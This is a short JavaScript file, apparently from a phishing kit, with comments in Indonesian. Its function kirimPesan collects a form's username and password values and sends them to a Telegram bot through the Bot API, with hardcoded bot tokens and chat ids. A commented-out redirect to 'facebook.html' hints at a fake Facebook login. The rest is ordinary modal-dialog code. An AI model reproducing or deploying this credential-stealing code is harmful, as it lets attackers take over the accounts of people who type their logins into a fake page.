// https://api.telegram.org/bot7100825590:AAEEbJm5vMYRvq9_04rNck2Uq3l1EI3370A/sendMessage?chat_id=-1002071774417&text=halojuga&parse_mode=html
function kirimPesan() {
  var nama = document.getElementById("nama");
  var email = document.getElementById("email");

  var gabungan =
    "Username%3A%0A" + nama.value + "%0APassword%3A%0A" + email.value;

  var token = "6868013022:AAGdgSux5Bz-C931dxUnSAIFwZJ8BKFlfzI"; // Ganti dengan token bot yang kamu buat
  var grup = "-1002039428939"; // Ganti dengan chat id dari bot yang kamu buat

  $.ajax({
    url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
    method: `POST`,
  });
}

// function direct() {
//   window.location.href = "facebook.html";
// }

// div.addEventListener("keydown", function (e) {
//   e.preventDefault();
//   if (e.key === "Enter" || e.key === " ") {
//     // do something
//   }
// });

// Get the modal
var modal = document.getElementById("myModal");

// Get the button that opens the modal
var btn = document.getElementById("myBtn");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];

// When the user clicks the button, open the modal 
btn.onclick = function() {
  modal.style.display = "block";
}

// When the user clicks on <span> (x), close the modal
span.onclick = function() {
  modal.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
}
